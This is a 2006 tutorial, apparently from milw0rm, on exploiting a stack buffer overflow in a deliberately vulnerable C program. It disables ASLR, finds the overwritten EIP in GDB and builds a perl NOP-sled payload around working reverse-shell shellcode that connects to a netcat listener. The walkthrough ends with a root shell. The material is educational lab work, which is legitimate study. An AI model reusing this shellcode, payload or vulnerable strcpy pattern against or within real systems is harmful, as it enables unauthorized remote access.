@@ -1,0 +1,348 @@
+-- Buffer Overflow Tutorial by Preddy - RootShell Security Group
+
+Hi we are going to do a basic stack overflow on a vulnerable program
+to get a reverse shell
+
+I apoligise for my english..it's not my native language
+
+Our vulnerable program:
+
+-- vuln-prog.c
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+ 
+int bof(char *string) {
+ 
+  char buffer[1024];
+ 
+  strcpy(buffer, string);
+ 
+  return 1;
+}
+ 
+int main(int argc, char *argv[]) {
+ 
+  bof(argv[1]);
+  printf("Done..\n");
+ 
+  return 1;
+}
+
+-- vuln-prog.c
+
+this program takes a user supplied string and copies it into 'buffer' which can hold 1024
+bytes of data. if a user sends 1040 bytes which is more then 1024 bytes.. it would
+cause the buffer to be overflowwed and it would overwrite parts of memory..
+
+lets compile our vulnerable program:
+
+gcc vuln-prog.c -o vuln-prog
+
+We need to disable the linux VA patch to successfully exploit
+this basic overflow..
+
+bash-3.00# cat /proc/sys/kernel/randomize_va_space 
+1
+bash-3.00# echo 0 > /proc/sys/kernel/randomize_va_space 
+bash-3.00# 
+bash-3.00# cat /proc/sys/kernel/randomize_va_space     
+0
+bash-3.00# 
+
+
+We use a debugger called GDB to debug the program to see what happens if we
+send more then 1024 bytes..
+
+bash-3.00# gdb ./vuln-prog
+GNU gdb 6.5
+Copyright (C) 2006 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...Using host libthread_db library "/lib/tls/libthread_db.so.1".
+
+(gdb) 
+
+we will use perl to supply a buffer which is larger then 1024 bytes and
+enough to overwrite parts of memory.
+
+(gdb) run `perl -e 'print "A"x1040'`
+Starting program: /root/Security/Vulntest/vuln-prog `perl -e 'print "A"x1040'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) 
+
+as you can see we supplied a string which holds 1040 x A
+
+A is 0x41 in it's hexadecimal format..
+
+now lets see what parts of our memory are overwritten..
+
+(gdb) i r
+eax            0x1      1
+ecx            0xfffff9e6       -1562
+edx            0xbffff8aa       -1073743702
+ebx            0xb7fcc000       -1208172544
+esp            0xbffff290       0xbffff290
+ebp            0x41414141       0x41414141
+esi            0xb7fce17c       -1208163972
+edi            0x2      2
+eip            0x41414141       0x41414141
+eflags         0x10282  [ SF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) 
+
+this is a important part to look at:
+
+eip            0x41414141       0x41414141
+
+eip is the Extended Instruction Pointer, eip contains the address
+to the next instruction.. so basicly it points to the address where
+the next piece of code will get executed..
+
+so overwriting eip with an address which contains our own code
+would allow us to control the flow of the program..
+
+we have overwritten eip with 41414141 which is AAAA 
+but 41414141 does not contain any code and is a invalid
+part of memory to point to..
+
+so we have to point it to our piece of code..
+ 
+to execute our own piece of code we will use something called: SHELLCODE
+
+Shellcode also knows as Bytecode which contains a set of cpu instructons
+
+We will not discuss the process of making your own shellcode
+so we will use metasploit to generate our shellcode..
+
+first of all we want to listen with netcat and wait for a shell to arrive
+
+so lets listen with netcat:
+
+bash-3.00# nc -l -p 9999 -vv
+listening on [any] 9999 ...
+
+netcat is listening on port 9999
+
+now lets get our ip address..
+
+bash-3.00# ifconfig |grep inet
+          inet addr:10.0.0.153  Bcast:10.0.0.255  Mask:255.255.255.0
+          inet addr:127.0.0.1  Mask:255.0.0.0
+
+
+our ip address is 10.0.0.153
+
+now lets check if netcat is indeed listening..
+
+bash-3.00# netstat -an |grep 9999
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN    
+
+as you can see netcat is listening on port 9999
+
+Lets browse to:
+
+http://metasploit.com:55555/PAYLOADS?MODE=SELECT&MODULE=linux_ia32_reverse
+
+to generate our shellcode..
+
+Fill in the form:
+
+LHOST	Required	ADDR = 10.0.0.153
+LPORT	Required	PORT = 9999
+
+and click Generate Payload..
+
+which generates us the following:
+
+/* linux_ia32_reverse -  LHOST=10.0.0.153 LPORT=9999 Size=96 Encoder=PexFnstenvSub http://metasploit.com */
+
+"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
+"\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c"
+"\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d"
+"\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6"
+"\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e"
+"\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16";
+
+as you can see our shellcode is 96 bytes large.
+
+lets strip it off
+
+\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16
+
+this piece of shellcode will connect back to 10.0.0.153 on port 9999 where netcat is listening... and provide a shell
+
+now to find our shellcode in memory would be a pain in the ass and it wouln't we flexible
+so we need to use the NOP method.
+
+a NOP is a instruction which does nothing (No Operation - 0x90)
+
+so we place a set of NOP instructions (nopsled) before our shellcode
+and point eip to somewhere in our NOPSLED , our payload should look
+something like this
+
+[garbage data - A's (0x41)] - [nopsled] - [shellcode] - [eip]
+
+Now we need to calculate howmuch we exactly need to send:
+
+we used 1040 bytes to overflow eip with 0x41414141
+
+eip is 4 bytes so:
+
+1040 - 4 = 1036
+
+then we need 96 bytes for our shellcode
+
+1036 - 96 = 940
+
+and we can use 940 bytes for our garbage data and our nopsled.
+
+ill use 340 bytes for our nopsled..
+
+so thats 340 x 0x90
+
+940 - 340 = 600
+
+and there are 600 bytes left to use for garbage data
+
+thats 600 x A (0x41)
+
+our payload should look like this:
+
+600 x A(0x41) + 340 x NOP(0x90) + 96 bytes of shellcode + 4 bytes of EIP = 1040 bytes
+
+PAYLOAD:
+
+`perl -e 'print "A"x600,"\x90"x340,"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16","BBBB"'`
+
+we will overwrite eip with BBBB (0x42424242) for debugging purposes..
+
+(gdb) run `perl -e 'print "A"x600,"\x90"x340,"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16","\x40\xf7\xff\xbf"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/Security/Vulntest/vuln-prog `perl -e 'print "A"x600,"\x90"x340,"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16","BBBB"'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) 
+
+as you can see eip got overwritten with 0x42424242 which is BBBB and BBBB is the last
+part of our payload which we used to overwrite eip..
+
+now we need to point eip to our nopsled instead of 0x42424242
+
+lets analyze our memory and see where our nopsled is:
+
+(gdb) x/2000xb $esp
+
+now lets hit enter untill we see a huge set of NOP instructions (0x90)
+
+0xbffff6e0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff6e8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff6f0:     0x41    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff6f8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff700:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff708:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff710:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff718:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff720:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff728:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff730:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff738:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff740:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff748:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff750:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff758:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff760:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff768:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff770:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff778:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff780:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff788:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff790:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+
+just before our NOPSLED we see our garbage data full of A's (0x41)
+thats how we constructed our payload before :)
+
+after our NOPSLED we have our shellcode:
+
+0xbffff820:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff828:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff830:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff838:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffff840:     0x90    0x90    0x90    0x90    0x90    0x31    0xc9    0x83
+0xbffff848:     0xe9    0xee    0xd9    0xee    0xd9    0x74    0x24    0xf4
+---Type <return> to continue, or q <return> to quit---
+0xbffff850:     0x5b    0x81    0x73    0x13    0x5e    0x10    0xdb    0x16
+0xbffff858:     0x83    0xeb    0xfc    0xe2    0xf4    0x6f    0xcb    0x88
+0xbffff860:     0x55    0x0d    0x7a    0xd9    0x7c    0x38    0x48    0x52
+0xbffff868:     0xf7    0x93    0x90    0x48    0x4f    0xee    0x2f    0x16
+0xbffff870:     0x96    0x17    0x69    0x22    0x4d    0x04    0x78    0xd1
+0xbffff878:     0x16    0x5e    0x89    0xbd    0x7e    0x79    0x1f    0x98
+0xbffff880:     0x70    0x0d    0x99    0x3a    0xa6    0x38    0x40    0x8a
+0xbffff888:     0x45    0xd7    0xf1    0x98    0xdb    0xde    0x42    0xb3
+
+our shellcode starts with \x31 as you can see..
+
+now we need to overwrite eip so it points to somewhere in our set of NOP instructions
+
+it will execute the NOP instructions till it reaches our shellcode
+and when it executes our shellcode it will bring us a reverse shell on
+port 9999..
+
+so lets choose an address which is in our nopsled..
+
+0xbffff740
+
+lets write it in little-endian format (reversely)
+
+\x40\xf7\xff\xbf
+
+and lets place that in our payload.. so it will look like this:
+
+`perl -e 'print "A"x600,"\x90"x340,"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16","\x40\xf7\xff\xbf"'`
+
+lets run the program with gdb and our payload as an argument..
+
+(gdb) run `perl -e 'print "A"x600,"\x90"x340,"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16","\x40\xf7\xff\xbf"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/Security/Vulntest/vuln-prog `perl -e 'print "A"x600,"\x90"x340,"\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e\x10\xdb\x16\x83\xeb\xfc\xe2\xf4\x6f\xcb\x88\x55\x0d\x7a\xd9\x7c\x38\x48\x52\xf7\x93\x90\x48\x4f\xee\x2f\x16\x96\x17\x69\x22\x4d\x04\x78\xd1\x16\x5e\x89\xbd\x7e\x79\x1f\x98\x70\x0d\x99\x3a\xa6\x38\x40\x8a\x45\xd7\xf1\x98\xdb\xde\x42\xb3\x39\x71\x63\xb3\x7e\x71\x72\xb2\x78\xd7\xf3\x89\x45\xd7\xf1\x6b\x1d\x93\x90\xdb\x16","\x40\xf7\xff\xbf"'`
+
+
+now let's turn back netcat which we left listening on port 9999
+
+bash-3.00# nc -l -p 9999 -vv
+listening on [any] 9999 ...
+10.0.0.153: inverse host lookup failed: No address associated with name
+connect to [10.0.0.153] from (UNKNOWN) [10.0.0.153] 59126
+
+as you can see we overflowwed the buffer and got ourselves a reverse shell :D
+
+bash-3.00# nc -l -p 9999 -vv
+listening on [any] 9999 ...
+10.0.0.153: inverse host lookup failed: No address associated with name
+connect to [10.0.0.153] from (UNKNOWN) [10.0.0.153] 59126
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom)
+uname -a
+Linux hp 2.6.17.6 #1 SMP PREEMPT Sun Jul 16 14:49:45 CEST 2006 i686 unknown unknown GNU/Linux
+
+
+Cya around guys..
+
+Preddy..
+
+# milw0rm.com [2006-07-21]
